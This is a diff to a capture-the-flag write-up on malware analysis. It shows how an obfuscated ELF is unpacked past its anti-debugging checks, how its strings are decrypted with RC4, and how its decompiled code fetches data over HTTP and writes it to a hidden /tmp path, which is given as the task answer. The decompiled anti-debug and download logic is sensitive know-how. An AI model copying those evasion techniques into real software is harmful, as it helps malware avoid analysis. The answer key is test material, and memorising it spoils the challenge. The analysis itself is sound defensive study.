@@ -8,21 +8,22 @@ authors: ["flocto"]
 image: "./hero.png"
 order: 4
 ---
+import Callout from '@/components/Callout.astro'
 
 ## Task 4 - Unpacking Insight - (Malware Analysis)
-> Once back at NSA the team contacts the NSA liaison at FBI to see if they have any information about what was discovered in the configuration data. FBI informs us that the facility registered to host that domain is on a watchlist for suspected criminal activity. With this tip, the FBI acquires a warrant and raids the location. Inside the facility, the server is discovered along with a suspect. The suspect is known to the FBI as a low-level malware actor. During questioning, they disclose that they are providing a service to host malware for various cybercrime groups, but recently they were contacted by a much more secretive and sophisticated customer. While they don't appear to know anything about who is paying for the service, they provide the FBI with the malware that was hosted.
-> 
-> Back at NSA, you are provided with a copy of the file. There is a lot of high level interest in uncovering who facilitated this attack. The file appears to be obfuscated.
-> 
+<Callout title="Description" showVariant={false}>
+Once back at NSA the team contacts the NSA liaison at FBI to see if they have any information about what was discovered in the configuration data. FBI informs us that the facility registered to host that domain is on a watchlist for suspected criminal activity. With this tip, the FBI acquires a warrant and raids the location. Inside the facility, the server is discovered along with a suspect. The suspect is known to the FBI as a low-level malware actor. During questioning, they disclose that they are providing a service to host malware for various cybercrime groups, but recently they were contacted by a much more secretive and sophisticated customer. While they don't appear to know anything about who is paying for the service, they provide the FBI with the malware that was hosted.
+
+Back at NSA, you are provided with a copy of the file. There is a lot of high level interest in uncovering who facilitated this attack. The file appears to be obfuscated.
+
 You are tasked to work on de-obfuscating the file and report back to the team.
-> 
-> Downloads:
->
-> - obfuscated file (suspicious)
->
-> Prompt:
->
-> - Submit the file path the malware uses to write a file
+
+Downloads:
+- obfuscated file (suspicious)
+
+Prompt:
+- Submit the file path the malware uses to write a file
+</Callout>
 
 This time, we're only given a single binary file named `suspicious`. Running the `file` command on it shows it's just a standard ELF 64-bit LSB executable, so I wonder what kind of obfuscation it could be using.
 
@@ -52,7 +53,7 @@ Rather than try to reverse all of the unpacking statically, I realized that if w
 We can do this fairly easily by just stepping through `main` and correctly setting the value of any registers that might cause an early exit. After a bit of trial and error, I was able to reach the unpacking function without any issues.
 
 The three main anti-debugging checks that needed to be bypassed were:
-```c
+```c collapse={2-32} collapse={35-81} collapse={84-91}
 uint64_t sigaction_setjmp_check() // 0x4035e0
     struct tcbhead_t* tcb
     uint64_t CANARY = tcb->stack_guard
@@ -85,7 +86,6 @@ uint64_t sigaction_setjmp_check() // 0x4035e0
         return zx.q(rax_1.b)
     
     __stack_chk_fail()
-    
 
 uint64_t proc_self_status_check() // 0x403470
     struct tcbhead_t* tcb
@@ -150,7 +150,7 @@ int32_t ptrace_check() // 0x403590
 For the first check, we need to skip the `_setjmp` illegal memory access, since the debugger will catch the signal before the sigaction handler can run. For the second check and third check, we can just set the return values to indicate no debugger is present.
 
 Finally, once we get to the start of the `sub_405da0` function, we can simply dump the memory region out from the address in `rdi` with size in `rsi`, which is where the unpacked payload is stored before being written to the `memfd`.
-```sh
+```sh {"buf": 10} {"buf length": 9} collapse={11-22}
 [ Legend: Modified register | Code | Heap | Stack | Writable | ReadOnly | None | RWX | String ]
 ---- registers ----
 $rax   : 0x0000000000000000
@@ -183,9 +183,8 @@ From the `dlsym` call earlier, we know we are looking for some function called `
 ![run function in Binary Ninja](/img/writeups/2026/nsa-cbc/task4-run-func.png)
 
 The first thing the `run` function does is initialize some struct that clearly is using the RC4 Sbox:
-```c
+```cpp {"rc4 setup": 2-11}
 char* sub_407c8e(char* arg1, char* key, int64_t n)
-
     for (int32_t i = 0; i s<= 0xff; i += 1)
         arg1[sx.q(i)] = i.b
     
@@ -203,9 +202,8 @@ char* sub_407c8e(char* arg1, char* key, int64_t n)
 ```
 
 This gets stored in the `run` function, which is then passed in to the other functions for decryption:
-```c
+```c {"decryption": 5}
 uint64_t sub_408574(struct cipher* cipher)
-
     struct tcbhead_t* tcb
     uint64_t CANARY = tcb->stack_guard
     class std::string var_68
@@ -217,9 +215,7 @@ uint64_t sub_408574(struct cipher* cipher)
     int32_t rbx_1
     
     rbx_1 = rax == 0 ? 0 : 1
-    
     std::string::~string(this: &var_68)
-    tcb->stack_guard
     
     if (CANARY == tcb->stack_guard)
         return zx.q(rbx_1)
@@ -228,7 +224,7 @@ uint64_t sub_408574(struct cipher* cipher)
 ```
 
 We can extract all of the strings that get decrypted by `sub_407eff`, which is just standard RC4 decryption, and print it out statically to see what interesting strings are used:
-```python
+```python collapse={7-20} collapse={28-41}
 from Crypto.Cipher import ARC4
 key = b'skibidi'
 
@@ -274,7 +270,7 @@ for i, e in enumerate(enc):
 
 Inside of the last function called in `run`, the function attempts to connect to the HTTP server at str8 on port 8080, then sends the str9 GET request. If it recieves a response, it writes the response to a file whose path is the concatenation of str10 through str12.
 
-```c
+```c {"connect on str8:8080 ":9-11} {"str9 HTTP request": 13-19} ins={"str10-str12 ofstream creation": 20-30}
 if (fd s>= 0)
     class std::string out
     rc4_decrypt(&out, enc: &str8, enc_len: 0xc, cipher)
@@ -307,5 +303,5 @@ if (fd s>= 0)
             std::ofstream::ofstream(this: &var_628, __s: &var_6d8)
 ```
 
-This gives us the full path the malware uses to write the file, which is `/tmp/.JoZ0To1QYoPN8y47`, the answer to submit for this task.
+This gives us the full path the malware uses to write the file, which is `/tmp/` + `.` + `JoZ0To1QYoPN8y47` = `/tmp/.JoZ0To1QYoPN8y47`, the answer to submit for this task.
 
